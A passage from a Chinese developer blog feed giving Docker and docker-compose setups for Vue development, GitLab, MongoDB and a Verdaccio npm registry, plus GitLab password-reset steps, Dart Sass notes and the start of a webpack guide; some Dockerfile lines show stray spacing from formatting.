aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"node-vue\" tabindex=\"-1\"> Node + Vue</h3>\n<p>在项目文件夹下创建 <code>dockerfile</code></p>\n<div><pre><code><span><span>FROM</span> node: latest</span>\n\n<span># 设置时区</span>\n<span><span>RUN</span> sh - c <span>\"echo 'Asia/Shanghai' > /etc/timezone\"</span> &amp;&amp; <span>\\</span>\n    dpkg - reconfigure - f noninteractive tzdata</span>\n\n<span># 使用阿里云的Ubuntu镜像</span>\n<span><span>RUN</span> echo <span>'\\n\\\ndeb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\\n\\\ndeb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\\n\\\ndeb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\\n\\\ndeb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\\n\\\ndeb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\\n\\\ndeb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\\n\\\ndeb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\\n\\\ndeb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\\n\\\ndeb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\\n\\\ndeb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\\n'</span>\\ ></span>\n    /etc/apt / sources.list\n\n<span><span>RUN</span> apt - get update\\ &amp;&amp;</span>\n    apt - get install - y\\# node - sass 等编译依赖\nmake gcc g++build - essential python2 .7\\# 命令行工具\ncurl wget vim git git - flow yarn xsel\n\n<span># 切换 node 的软件版本源 => 切源工具 cgr 和 nrm</span>\n<span># cgr 是基于nrm的改进版本, 进行了一些优化, 能同时管理 npm、 yarn 源# cgr use taobao n => 只是切换 npm 源# cgr use taobao y => 只是切换 yarn 源</span>\n<span><span>RUN</span> true<span>\\</span>\n    &amp;&amp;</span>\n    npm install - g cgr nrm\\ &amp;&amp;\n    cgr use taobao\\ &amp;&amp;\n    npm i - g serve @vue / cli @vue / cli - service - global\\\ncommitizen conventional - changelog - cli eslint - plugin - vue\\\nnpm - check - updates npx\n\n<span># 创建工作目录</span>\n<span><span>RUN</span> mkdir / workspace</span>\n\n<span><span>WORKDIR</span> / workspace</span>\n\n<span># 添加权限, 755 或者 a + x</span>\n<span><span>RUN</span> chmod - R 755 / workspace</span>\n\n<span><span>VOLUME</span> / workspace</span>\n\n<span><span>EXPOSE</span> 8080</span>\n<span><span>EXPOSE</span> 5000</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在项目文件夹下创建 <code>docker-compose.yml</code></p>\n<div><pre><code><span>version</span><span>:</span> <span>'3'</span>\n<span>services</span><span>:</span>\n    <span>dev</span><span>:</span>\n    <span>image</span><span>:</span> <span>vueimage</span><span>:</span> <span>1.0</span>\n<span>ports</span><span>:</span>\n\n    <span>-</span> <span>\"8080:8080\"</span> <span># 映射端口, 将本机的 8080 端口映射到 docker 的 8080 端口, npm run serve</span>\n\n<span>restart</span><span>:</span> always <span># 每次开启 docker 的时候重启服务, 适用于 MySQL、 nginx 类似于这种的服务</span>\n<span>volumes</span><span>:</span>\n\n    <span>-</span> ./<span>:</span>/workspace <span># 将执行命令的目录映射到 docker 容器的 /workspace目录</span>\n\n<span>stdin_open</span><span>:</span> <span>true</span> <span># 命令行输入映射, 不进行设置会导致无法正常进入 docker</span>\n<span>tty</span><span>:</span> <span>true</span> <span># 使用TTY模式（ pseudo - TTY）。 若要使用bash, 则必须设置该选项。 若不设置该选项, 则可以输入命令, 但不显示shell</span>\n<span>web</span><span>:</span>\n    <span>image</span><span>:</span> vueimage<span>:</span><span>1.0</span>\n<span>ports</span><span>:</span>\n\n    <span>-</span> <span>\"5000:5000\"</span> <span># 映射端口, 将本机的 5000 端口映射到 docker 的 5000 端口, npm run build &amp;&amp; serve dist\\</span>\n\n<span>restart</span><span>:</span> always <span># 每次开启 docker 的时候重启服务, 适用于 MySQL、 nginx 类似于这种的服务</span>\n<span>volumes</span><span>:</span>\n\n    <span>-</span> ./<span>:</span>/workspace <span># 将执行命令的目录映射到 docker 容器的 /workspace目录</span>\n\n<span>stdin_open</span><span>:</span> <span>true</span> <span># 命令行输入映射, 不进行设置会导致无法正常进入 docker</span>\n<span>tty</span><span>:</span> <span>true</span> <span># 使用TTY模式（ pseudo - TTY）。 若要使用bash, 则必须设置该选项。 若不设置该选项, 则可以输入命令, 但不显示shell</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在项目文件夹下执行(编译一个镜像容器出来)</p>\n<div><pre><code><span>docker</span> build -t vueimage:1.0 <span>.</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>编译完成之后执行, 用以启动容器</p>\n<div><pre><code><span>docker-compose</span> up -d\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>使用 <code>docker ps</code> 查看 容器的 id, 之后使用以下命令进入容器</p>\n<div><pre><code><span>docker</span> <span>exec</span> -it <span>[</span>docker_id<span>]</span> <span>zsh</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>确认当前目录已经挂载了当前的项目目录, 使用 <code>pwd</code> 确认当前的目录为 <code>/workspace</code> , 执行安装依赖命令并且启动服务</p>\n<div><pre><code><span>yarn</span> <span>install</span>\n<span>yarn</span> serve\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>服务启动之后就在浏览器中访问 <code>http://127.0.0.1:8080</code> 经过上面的配置, 我们就可以在主机上使用喜欢的编辑器编辑代码, 通过 docker 执行。但是使用 <code>yarn serve</code> 命令进行开发时, 会发现一个问题: 在编辑器中编辑文件后, docker 无法监听到文件的修改, 从而重新编译、刷新页面；我们可以采用 webpack 的轮询功能解决:</p>\n<p>关于 webpack 的轮询功能 =&gt; <a href=\"https://www.webpackjs.com/configuration/watch/\" target=\"_blank\" rel=\"noopener noreferrer\">webpack</a></p>\n<p><code>vue.config.js</code></p>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n  <span>devServer</span><span>:</span> <span>{</span>\n    <span>watchOptions</span><span>:</span> <span>{</span>\n      <span>aggregateTimeout</span><span>:</span> <span>300</span><span>,</span> <span>// 当第一个文件更改,会在重新构建前增加延迟。这个选项允许 webpack 将这段时间内进行的任何其他更改都聚合到一次重新构建里。以毫秒为单位:</span>\n      <span>poll</span><span>:</span> <span>1000</span><span>,</span> <span>// 通过传递 true 开启 polling,或者指定毫秒为单位进行轮询。</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>到此已经全部配置完毕, 重新 <code>yarn serve</code> 然后就可以愉快的写代码了</p>\n<h3 id=\"gitlab\" tabindex=\"-1\"> Gitlab</h3>\n<h4 id=\"英文官方原版\" tabindex=\"-1\"> 英文官方原版</h4>\n<p>在项目文件夹下创建 <code>docker-compose.yml</code></p>\n<div><pre><code><span>version</span><span>:</span> <span>\"3\"</span>\n\n<span>services</span><span>:</span>\n  <span>gitlab</span><span>:</span>\n    <span>container_name</span><span>:</span> gitlab\n    <span>image</span><span>:</span> gitlab/gitlab<span>-</span>ce\n    <span>restart</span><span>:</span> always\n    <span>hostname</span><span>:</span> <span>\"gitlab-en\"</span>\n    <span>environment</span><span>:</span>\n      <span>GITLAB_OMNIBUS_CONFIG</span><span>:</span> <span>|</span><span>\n        # external_url 'http://gitlab.example.com:9090'</span>\n    <span>ports</span><span>:</span>\n      <span>-</span> <span>\"80:80\"</span>\n      <span>-</span> <span>\"443:443\"</span>\n      <span>-</span> <span>\"2224:22\"</span>\n\n    <span>volumes</span><span>:</span>\n      <span>-</span> ./en/config<span>:</span>/etc/gitlab\n      <span>-</span> ./en/logs<span>:</span>/var/log/gitlab\n      <span>-</span> ./en/data<span>:</span>/var/opt/gitlab\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"中文社区版\" tabindex=\"-1\"> 中文社区版</h4>\n<p>在项目文件夹下创建 <code>docker-compose.yml</code></p>\n<div><pre><code><span>version</span><span>:</span> <span>\"3\"</span>\n\n<span>services</span><span>:</span>\n  <span>gitlab-ce</span><span>:</span>\n    <span>container_name</span><span>:</span> gitlab<span>-</span>ce\n    <span>image</span><span>:</span> twang2218/gitlab<span>-</span>ce<span>-</span>zh\n    <span>restart</span><span>:</span> always\n    <span>hostname</span><span>:</span> <span>\"gitlab\"</span>\n    <span>environment</span><span>:</span>\n      <span>TZ</span><span>:</span> <span>\"Asia/Shanghai\"</span>\n      <span>GITLAB_OMNIBUS_CONFIG</span><span>:</span> <span>|</span><span>\n        # pages_external_url = \"http://gitlab.demo.io/\"\n        gitlab_rails['time_zone'] = 'Asia/Shanghai'\n        gitlab_pages['enable'] = true</span>\n    <span>ports</span><span>:</span>\n      <span>-</span> <span>\"80:80\"</span>\n      <span>-</span> <span>\"443:443\"</span>\n      <span>-</span> <span>\"2224:22\"</span>\n\n    <span>volumes</span><span>:</span>\n      <span>-</span> ./cn/config<span>:</span>/etc/gitlab\n      <span>-</span> ./cn/logs<span>:</span>/var/log/gitlab\n      <span>-</span> ./cn/data<span>:</span>/var/opt/gitlab\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"mongodb\" tabindex=\"-1\"> MongoDB</h3>\n<div><pre><code><span>version</span><span>:</span> <span>\"3\"</span>\n\n<span>services</span><span>:</span>\n  <span>mongo</span><span>:</span>\n    <span>image</span><span>:</span> mongo\n    <span>container_name</span><span>:</span> mongo\n    <span>hostname</span><span>:</span> mongo\n    <span>restart</span><span>:</span> always\n    <span>ports</span><span>:</span>\n      <span>-</span> <span>\"27017:27017\"</span>\n    <span>environment</span><span>:</span>\n      <span>TZ</span><span>:</span> Asia/Shanghai\n      <span>MONGO_INITDB_DATABASE</span><span>:</span> test\n      <span>MONGO_INITDB_ROOT_USERNAME</span><span>:</span> root\n      <span>MONGO_INITDB_ROOT_PASSWORD</span><span>:</span> yourpassword\n    <span>volumes</span><span>:</span>\n      <span>-</span> /etc/localtime<span>:</span>/etc/localtime\n      <span>-</span> ./data<span>:</span>/data/db\n    <span>command</span><span>:</span> mongod\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"拓展\" tabindex=\"-1\"> 拓展</h3>\n<h4 id=\"重置普通用户的密码\" tabindex=\"-1\"> 重置普通用户的密码</h4>\n<p>进入容器之后执行以下命令</p>\n<div><pre><code>$ gitlab-rails console production <span># 进入gitlab管理控制台</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> <span>user</span><span>=</span>User.where<span>(</span>name: <span>\"[user_name]\"</span><span>)</span>.first <span># 将 [user_name] 替换成用户名</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.password<span>=</span><span>12345678</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.password_confirmation<span>=</span><span>12345678</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.save<span>!</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> quit\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"重设管理员密码\" tabindex=\"-1\"> 重设管理员密码</h4>\n<p>进入容器之后执行以下命令</p>\n<div><pre><code>$ gitlab-rails console production <span># 进入gitlab管理控制台</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> <span>user</span><span>=</span>User.where<span>(</span>id: <span>1</span><span>)</span>.first <span># 将 [user_name] 替换成用户名</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.password<span>=</span><span>12345678</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.password_confirmation<span>=</span><span>12345678</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.save<span>!</span>\nirb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> quit\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"私有-npm-代理注册表\" tabindex=\"-1\"> 私有 npm 代理注册表</h2>\n<p>在项目文件夹下创建 <code>docker-compose.yml</code></p>\n<div><pre><code><span>version</span><span>:</span> <span>\"3\"</span>\n\n<span>services</span><span>:</span>\n  <span>npm-private</span><span>:</span>\n    <span>container_name</span><span>:</span> npm<span>-</span>private\n    <span>image</span><span>:</span> verdaccio/verdaccio\n    <span>restart</span><span>:</span> always\n    <span>ports</span><span>:</span>\n      <span>-</span> <span>\"4873:4873\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"拓展-1\" tabindex=\"-1\"> 拓展</h3>\n<div><p>提示</p>\n<p>windows 环境下不想使用 docker 的解决方案, 使用 <code>forever</code> + <code>verdaccio</code></p>\n</div>\n<p>安装依赖</p>\n<div><pre><code><span>npm</span> i -g forever verdaccio\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>修改 <code>verdaccio</code> 的配置文件, 参考文件路径为 <code>C:/Users/Administrator/AppData/Roaming/verdaccio/config.yaml</code> （必须修改, 否则只能本机访问）, 在该文件内添加</p>\n<div><pre><code>listen: 0.0.0.0:4873\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>编写 <code>bat</code> windows 脚本</p>\n<p>开始脚本 <code>forever-npm-start.bat</code></p>\n<div><pre><code>@echo off\nC:\ncd C:\\Users\\Administrator\\AppData\\Roaming\\npm\\node_modules\\verdaccio\\build\\lib\nforever start cli.js\nexit\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>结束脚本 <code>forever-npm-stop.bat</code></p>\n<div><pre><code>@echo off\nC:\ncd C:\\Users\\Administrator\\AppData\\Roaming\\npm\\node_modules\\verdaccio\\build\\lib\nforever stop cli.js\nexit\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"css-预处理-sass-的默认实现将迁移到-dart-sass\" tabindex=\"-1\"> CSS 预处理 SASS 的默认实现将迁移到 Dart Sass</h3>\n<p>Web 开发中流行的 CSS 预处理 - Sass 14, 于 2016 年 11 月 1 日在博客正式对外公布了 alpha 版本的 Dart Sass 32 项目, 即他们使用 Dart 对 Sass 进行了重写。对于这次迁移/重写, Sass 项目组做了以下说明:</p>\n<p>关于 <a href=\"https://github.com/sass/dart-sass\" target=\"_blank\" rel=\"noopener noreferrer\">github:dart-sass</a> <a href=\"https://sass-lang.com/dart-sass\" target=\"_blank\" rel=\"noopener noreferrer\">dart-sass</a></p>\n<p>因为使用 <code>node-sass</code> 无论是在 Windows 环境下还是在 docker 的 liunx 环境下都需要依赖 <code>gcc</code> 和 <code>python2.7</code> , 有的时候会出现编译错误（指的是在执行 <code>npm install</code> 安装 <code>node-sass</code> 的时候由于部分库不齐备或者是编译原因导致 <code>node-sass</code> 无法正常安装）, 所以使用 <code>dart-sass</code> 来代替 <code>node-sass</code> 是个不错的选择, 至少目前在自测中是没有出现编译问题的, 至于兼容性问题, GitHub 文档中也给出承诺 <a href=\"https://github.com/sass/dart-sass#browser-compatibility\" target=\"_blank\" rel=\"noopener noreferrer\">Browser Compatibility</a></p>\n<h3 id=\"为什么重写-sass\" tabindex=\"-1\"> 为什么重写 Sass？</h3>\n<p>Sass 的主要实现有 Ruby Sass 7 和 LibSass 10（node-sass 底层使用的是 LibSass）, 它们都有各自的优缺点。Ruby Sass 的实现语言是高级语言 Ruby, 更容易迭代, 但存在运行速度慢, 不易安装的缺点。LibSass 虽然速度快, 但它的开发语言是 C/C++, 迭代速度慢, 无法快速地添加各种功能。</p>\n<h3 id=\"为什么使用-dart\" tabindex=\"-1\"> 为什么使用 Dart？</h3>\n<p>Dart 的运行速度是真的快, 对于大型样式文件, Dart Sass 的处理速度是 Ruby Sass 的 5~10 倍, 且只比 LibSass 慢 1.5 倍左右。同时, Dart 是一门具备静态类型的动态语言, 对比 C/C++ 甚至是 Ruby, Dart 相对更容易上手且代码也更易于编写和维护。此外, Dart 具备编译输出为 JavaScript 的能力, 使得 Dart Sass 可以兼容 NodeJS 平台。</p>\n<h3 id=\"各种实现的后续规划\" tabindex=\"-1\"> 各种实现的后续规划？</h3>\n<p>LibSass 作为目前性能最好的 Sass 实现, 后续将继续维护, 只是它不再需要背负快速添加各种新功能的压力。Ruby Sass 目前也会同步维护, 但在无人接手的情况下, 它将逐渐边缘化。Sass 项目组后续主要精力将转移到 Dart Sass, 其稳定版本预计在 2017 年初放出。</p>\n<h3 id=\"git-commit\" tabindex=\"-1\"> git commit</h3>\n<p>现在由于我们在 docker 内部安装项目依赖, 也就是说我们当前的环境变成了 liunx, 相关的依赖包也就是 liunx 的依赖包, 所以在 windows 环境下执行 <code>git commit</code> 的时候会报依赖找不到, 那是因为安装了 liunx 的依赖包, 两个平台的安装包是不一样的</p>\n<p>那么在 docker 下执行 <code>git commit</code> 的时候又会失败, 因为 commit 的时候 git 需要知道当前的 commit 作者是谁, 这时候不必全局配置 commit 的 config 信息, 只需在项目目录下执行</p>\n<div><pre><code><span>git</span> config   user.name <span>'XXX'</span>\n<span>git</span> config   user.email <span>'XXX'</span>\n<span># or</span>\n<span>git</span> config  --local  user.name <span>'XXX'</span>\n<span>git</span> config  --local user.email <span>'XXX'</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>设置完用 <code>git config --list</code> 进行检验, 之后的 commit 操作就在 docker 容器下执行就行了</p>\n",
      "date_published": "2019-03-26T14:41:23.000Z",
      "date_modified": "2022-08-01T13:55:22.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "webpack 初学指南",
      "url": "https://vxhly.github.io/views/manual/webpack-guide.html",
      "id": "https://vxhly.github.io/views/manual/webpack-guide.html",
      "summary": "前言\n这边用到的 webpack 版本 4.0+, 这边将接触到 TypeScript, ES6, ES7, sass 等 loader ... 不想解释了直接上代码。\n\n",
      "content_html": "<div><p>前言</p>\n<p>这边用到的 webpack 版本 4.0+, 这边将接触到 TypeScript, ES6, ES7, sass 等 loader ... 不想解释了直接上代码。</p>\n</div>\n\n<h2 id=\"目录结构\" tabindex=\"-1\"> 目录结构</h2>\n<div><pre><code>--- dist\n  <span>|</span>- css\n  <span>|</span>- js\n  <span>|</span>- images\n  <span>|</span>- fonts\n  <span>|</span>- index.html\n--- src\n  <span>|</span>- scss\n  <span>|</span>- js\n  <span>|</span>- images\n  <span>|</span>- fonts\n  <span>|</span>- index.html\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"package-json\" tabindex=\"-1\"> package.json</h2>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"webpack-demo\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.0.0\"</span><span>,</span>\n  <span>\"description\"</span><span>:</span> <span>\"\"</span><span>,</span>\n  <span>\"main\"</span><span>:</span> <span>\"index.js\"</span><span>,</span>\n  <span>\"scripts\"</span><span>:</span> <span>{</span>\n    <span>\"serve\"</span><span>:</span> <span>\"webpack-dev-server --compress --progress \"</span><span>,</span>\n    <span>\"dev\"</span><span>:</span> <span>\"webpack --mode development\"</span><span>,</span>\n    <span>\"build\"</span><span>:</span> <span>\"webpack --mode production\"</span>\n  <span>}</span><span>,</span>\n  <span>\"author\"</span><span>:</span> <span>\"\"</span><span>,</span>\n  <span>\"license\"</span><span>:</span> <span>\"MIT\"</span><span>,</span>\n  <span>\"devDependencies\"</span><span>:</span> <span>{</span>\n    <span>\"@babel/core\"</span><span>:</span> <span>\"^7.1.5\"</span><span>,</span>\n    <span>\"@babel/preset-env\"</span><span>:</span> <span>\"^7.1.5\"</span><span>,</span>\n    <span>\"autoprefixer\"</span><span>:</span> <span>\"^9.3.1\"</span><span>,</span>\n    <span>\"babel-cli\"</span><span>:</span> <span>\"^6.26.0\"</span><span>,</span>\n    <span>\"babel-eslint\"</span><span>:</span> <span>\"^10.0.1\"</span><span>,</span>\n    <span>\"babel-loader\"</span><span>:</span> <span>\"^8.0.4\"</span><span>,</span>\n    <span>\"babel-preset-env\"</span><span>:</span> <span>\"^1.7.0\"</span><span>,</span>\n    <span>\"clean-webpack-plugin\"</span><span>:</span> <span>\"^1.0.0\"</span><span>,</span>\n    <span>\"compression-webpack-plugin\"</span><span>:</span> <span>\"^2.0.0\"</span><span>,</span>\n    <span>\"css-loader\"</span><span>:</span> <span>\"^1.0.1\"</span><span>,</span>\n    <span>\"eslint\"</span><span>:</span> <span>\"^5.9.0\"</span><span>,</span>\n    <span>\"eslint-loader\"</span><span>:</span> <span>\"^2.1.1\"</span><span>,</span>\n    <span>\"file-loader\"</span><span>:</span> <span>\"^2.0.0\"</span><span>,</span>\n    <span>\"html-webpack-plugin\"</span><span>:</span> <span>\"^3.2.0\"</span><span>,</span>\n    <span>\"html-withimg-loader\"</span><span>:</span> <span>\"^0.1.16\"</span><span>,</span>\n    <span>\"mini-css-extract-plugin\"</span><span>:</span> <span>\"^0.4.4\"</span><span>,</span>\n    <span>\"node-sass\"</span><span>:</span> <span>\"^4.10.0\"</span><span>,</span>\n    <span>\"open-browser-webpack-plugin\"</span><span>:</span> <span>\"0.0.5\"</span><span>,</span>\n    <span>\"optimize-css-assets-webpack-plugin\"</span><span>:</span> <span>\"^5.0.1\"</span><span>,</span>\n    <span>\"postcss-loader\"</span><span>:</span> <span>\"^3.0.0\"</span><span>,</span>\n    <span>\"sass-loader\"</span><span>:</span> <span>\"^7.1.0\"</span><span>,</span>\n    <span>\"standard\"</span><span>:</span> <span>\"^12.0.1\"</span><span>,</span>\n    <span>\"style-loader\"</span><span>:</span> <span>\"^0.23.1\"</span><span>,</span>\n    <span>\"ts-loader\"</span><span>:</span> <span>\"^5.3.0\"</span><span>,</span>\n    <span>\"typescript\"</span><span>:</span> <span>\"^3.1.6\"</span><span>,</span>\n    <span>\"url-loader\"</span><span>:</span> <span>\"^1.1.2\"</span><span>,</span>\n    <span>\"webpack\"</span><span>:</span> <span>\"^4.25.1\"</span><span>,</span>\n    <span>\"webpack-cli\"</span><span>:</span> <span>\"^3.1.2\"</span><span>,</span>\n    <span>\"webpack-dev-server\"</span><span>:</span> <span>\"^3.1.10\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"babelrc\" tabindex=\"-1\"> .babelrc</h2>\n<div><pre><code><span>{</span>\n  <span>\"presets\"</span><span>:</span> <span>[</span><span>\"@babel/preset-env\"</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"eslintrc-js\" tabindex=\"-1\"> .eslintrc.js</h2>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n  <span>root</span><span>:</span> <span>true</span><span>,</span>\n  <span>env</span><span>:</span> <span>{</span>\n    <span>node</span><span>:</span> <span>true</span><span>,</span>\n    <span>browser</span><span>:</span> <span>true</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>extends</span><span>:</span> <span>[</span><span>\"standard\"</span><span>]</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"tsconfig-json\" tabindex=\"-1\"> tsconfig.json</h2>\n<div><pre><code><span>{</span>\n  <span>\"compilerOptions\"</span><span>:</span> <span>{</span>\n    <span>\"module\"</span><span>:</span> <span>\"commonjs\"</span><span>,</span>\n    <span>\"target\"</span><span>:</span> <span>\"es5\"</span><span>,</span>\n    <span>\"sourceMap\"</span><span>:</span> <span>true</span><span>,</span>\n    <span>\"experimentalDecorators\"</span><span>:</span> <span>true</span>\n  <span>}</span><span>,</span>\n  <span>\"exclude\"</span><span>:</span> <span>[</span><span>\"node_modules\"</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"webpack-config-js\" tabindex=\"-1\"> webpack.config.js</h2>\n<div><pre><code><span>const</span> path <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>\n<span>// 拆分 css 出来单独打包</span>\n<span>const</span> MiniCssExtractPlugin <span>=</span> <span>require</span><span>(</span><span>'mini-css-extract-plugin'</span><span>)</span>\n<span>// 添加不同浏览器的兼容</span>\n<span>const</span> autoprefixer <span>=</span> <span>require</span><span>(</span><span>'autoprefixer'</span><span>)</span>\n<span>// 打包之前清掉原打包信息</span>\n<span>const</span> CleanWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'clean-webpack-plugin'</span><span>)</span>\n<span>// 结合 postcss 来解决不同浏览器的兼容</span>\n<span>const</span> OptimizeCssAssetsPlugin <span>=</span> <span>require</span><span>(</span><span>'optimize-css-assets-webpack-plugin'</span><span>)</span>\n<span>const</span> HtmlWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'html-webpack-plugin'</span><span>)</span>\n<span>const</span> OpenBrowserPlugin <span>=</span> <span>require</span><span>(</span><span>'open-browser-webpack-plugin'</span><span>)</span>\n<span>const</span> CompressionWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'compression-webpack-plugin'</span><span>)</span>\n\n<span>const</span> productionGzipExtensions <span>=</span> <span>[</span><span>'js'</span><span>,</span> <span>'css'</span><span>]</span>\n\nmodule<span>.</span>exports <span>=</span> <span>{</span>\n        <span>mode</span><span>:</span> <span>'development'</span><span>,</span>\n        <span>entry</span><span>:</span> path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>'./src/js/main.ts'</span><span>)</span><span>,</span>\n        <span>output</span><span>:</span> <span>{</span>\n            <span>filename</span><span>:</span> <span>'js/[name]-[hash:32].js'</span><span>,</span>\n            <span>path</span><span>:</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>'dist'</span><span>)</span>\n        <span>}</span><span>,</span>\n        <span>resolve</span><span>:</span> <span>{</span>\n            <span>extensions</span><span>:</span> <span>[</span><span>'.js'</span><span>,</span> <span>'.json'</span><span>,</span> <span>'.css'</span><span>,</span> <span>'.scss'</span><span>,</span> <span>'.sass'</span><span>,</span> <span>'ts'</span><span>]</span><span>,</span>\n            <span>alias</span><span>:</span> <span>{</span>\n                <span>'@'</span><span>:</span> path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>'src'</span><span>)</span>\n            <span>}</span>\n        <span>}</span><span>,</span>\n        <span>module</span><span>:</span> <span>{</span>\n            <span>rules</span><span>:</span> <span>[</span>\n\n                <span>{</span>\n                    <span>test</span><span>:</span> <span><span>/</span><span>\\.ts$</span><span>/</span></span><span>,</span>\n                    <span>exclude</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>\n                    <span>use</span><span>:</span> <span>'ts-loader'</span>\n                <span>}</span><span>,</span>\n                <span>{</span>\n                    <span>test</span><span>:</span> <span><span>/</span><span>\\.js$</span><span>/</span></span><span>,</span>\n                    <span>exclude</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>\n                    <span>use</span><span>:</span> <span>[</span>\n\n                        <span>{</span>\n                            <span>loader</span><span>:</span> <span>'babel-loader'</span>\n                        <span>}</span>\n\n                    <span>]</span>\n\n                <span>}</span><span>,</span>\n                <span>{</span>\n                    <span>test</span><span>:</span> <span><span>/</span><span>\\.(css)$</span><span>/</span></span><span>,</span>\n                    <span>// exclude: /node_modules/,</span>\n                    <span>use</span><span>:</span> <span>[</span><span>{</span>\n                        <span>loader</span><span>:</span> <span>'css-loader'</span><span>,</span>\n                        <span>options</span><span>:</span> <span>{</span>\n                            <span>importLoaders</span><span>:</span> <span>2</span>\n                        <span>}</span>\n                    <span>}</span><span>]</span>\n                